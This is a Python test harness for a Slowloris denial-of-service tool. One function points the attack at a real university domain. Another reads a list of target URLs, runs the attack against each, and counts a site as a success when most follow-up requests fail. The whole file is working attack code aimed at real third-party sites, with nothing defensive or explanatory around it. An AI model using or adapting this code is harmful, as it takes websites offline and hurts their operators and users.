#! venv/bin/python
# -*- coding: utf-8 -*-

import sys
import time
import random
import unittest
import urllib2
import subprocess as sub

from Queue import Queue
from threading import Thread
from slowloris import SlowLoris

__all__ = ['test_sl', 'test_sl_multi']


class RunCmd(Thread):
    def __init__(self, cmd, timeout):
        Thread.__init__(self)
        print cmd
        self.cmd = cmd
        self.timeout = timeout

    def run(self):
        self.p = sub.Popen(self.cmd)
        self.p.wait()

    def Run(self):
        self.start()
        self.join(self.timeout)

        if self.is_alive():
            self.p.terminate()  # use self.p.kill() if process needs a kill -9
            self.join()


def read_file(*args):
    res = []
    for file in args:
        with open(file, 'r') as f:
            res += [s.rstrip() for s in f.readlines()]
    return res


def test_sl():
    s = SlowLoris(url="kpi.ua")
    s.start()
    while True:
        try:
            sys.stdout.write("\r{}".format(s.get_counters()))
            sys.stdout.flush()
            time.sleep(1)
        except:
            s.kill()
            sys.exit(-1)


def do_work(url):
    RunCmd(["./slow_loris.py", "-u {}".format(url)], 60 * random.randint(2, 6))
    time.sleep(60 * random.randint(1, 3))
    n, m = 0, 0
    total = 10
    for _ in xrange(total):
        try:
            response = urllib2.urlopen(url, timeout=1)
            if response.getcode() == 200:
                n += 1
            else:
                m += 1
        except:
            m += 1
        time.sleep(0.043 * random.random())
    return m >= total // 2  # TRUE-success


def worker(queue):
    while True:
        url = queue.get()
        f = do_work(url)
        if f:
            sys.stdout.write('{}\n'.format(url))
            sys.stdout.flush()
        queue.task_done()


def test_sl_multi():
    urls = read_file('test_urls.txt')

    q = Queue()

    for _ in xrange(3):
        t = Thread(target=worker, args=(q,))
        t.setDaemon(True)
        t.start()

    for url in urls:
        q.put(url)

    q.join()


if __name__ == '__main__':
    test_sl_multi()
